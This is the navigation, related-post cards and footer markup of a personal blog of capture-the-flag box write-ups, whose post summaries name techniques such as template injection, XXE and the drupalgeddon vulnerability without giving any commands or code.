pb-1 ml-1 mt-2"><li><a href="/posts/DroidComp/">DroidComp writeup</a><li><a href="/posts/Faculty/">Faculty writeup</a><li><a href="/posts/Trick/">Trick writeup</a><li><a href="/posts/Seal/">Seal writeup</a><li><a href="/posts/Devzat/">Devzat writeup</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/easy-box/">Easy-box</a> <a class="post-tag" href="/tags/medium-box/">medium-box</a> <a class="post-tag" href="/tags/metasploit/">metasploit</a> <a class="post-tag" href="/tags/android/">android</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/apk/">apk</a> <a class="post-tag" href="/tags/api/">api</a> <a class="post-tag" href="/tags/forensics/">forensics</a> <a class="post-tag" href="/tags/git/">git</a> <a class="post-tag" href="/tags/jwt/">jwt</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Panda/"><div class="card-body"> <em class="timeago small" data-ts="1658322000" > 2022-07-20 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>RedPanda writeup</h3><div class="text-muted small"><p> Summary This was actually a pretty tricky box. It starts out with thymeleaf template injection, and ends with a slightly complicated XXE attack to gain root access. Let’s take a look! Foothold We ...</p></div></div></a></div><div class="card"> <a href="/posts/Antique/"><div class="card-body"> <em class="timeago small" data-ts="1655460000" > 2022-06-17 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Antique writeup</h3><div class="text-muted small"><p> Summary This box is centered around exploiting a misconfigured HP JetDirect printer via snmp. It also covers port forwarding an exploiting the CUPS service, which is a modular printing service for ...</p></div></div></a></div><div class="card"> <a href="/posts/Armageddon/"><div class="card-body"> <em class="timeago small" data-ts="1655463600" > 2022-06-17 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Armageddon writeup</h3><div class="text-muted small"><p> Summary This box focuses on exploiting the drupalgeddon vulnerability to achieve a web-shell. After this some database enumeration is required to obtain ssh credentials. After this, snap is used to...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/Opensource/" class="btn btn-outline-primary" prompt="Older"><p>Opensource writeup</p></a> <a href="/posts/Paper/" class="btn btn-outline-primary" prompt="Newer"><p>Paper writeup</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://twitter.com/BitisGabonica1">BitisGabonica</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/easy-box/">Easy-box</a> <a class="post-tag" href="/tags/medium-box/">medium-box</a> <a class="post-tag" href="/tags/metasploit/">metasploit</a> <a class="post-tag" href="/tags/android/">android</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/apk/">apk</a> <a class="post-tag" href="/tags/api/">api</a> <a class="post-tag" href="/tags/forensics/">forensics</a> <a class="post-tag" href="/tags/git/">git</a> <a class="post-tag" href="/tags/jwt/">jwt</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-4RZWBJKYF3"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-4RZWBJKYF3'); }); </script>
